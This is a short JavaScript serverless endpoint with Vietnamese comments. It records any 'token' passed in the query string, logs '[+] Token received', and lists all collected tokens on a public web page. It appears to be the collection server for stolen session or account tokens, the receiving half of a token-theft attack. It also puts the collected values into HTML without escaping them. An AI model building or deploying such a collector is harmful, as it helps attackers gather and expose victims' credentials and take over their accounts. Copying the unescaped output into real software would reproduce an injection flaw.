let logs = []; // lưu logs tạm trong bộ nhớ server (mỗi lần deploy reset)

export default function handler(req, res) {
  if (req.method === 'GET') {
    const { token } = req.query;

    if (token) {
      logs.push({ token, time: new Date().toISOString() });
      console.log(`[+] Token received: ${token}`);
    }

    // Hiển thị logs ra web
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    const html = `
      <h1>Logged Tokens</h1>
      <pre>${JSON.stringify(logs, null, 2)}</pre>
    `;
    res.status(200).send(html);
  } else {
    res.setHeader('Allow', ['GET']);
    res.status(405).send('Method Not Allowed');
  }
}
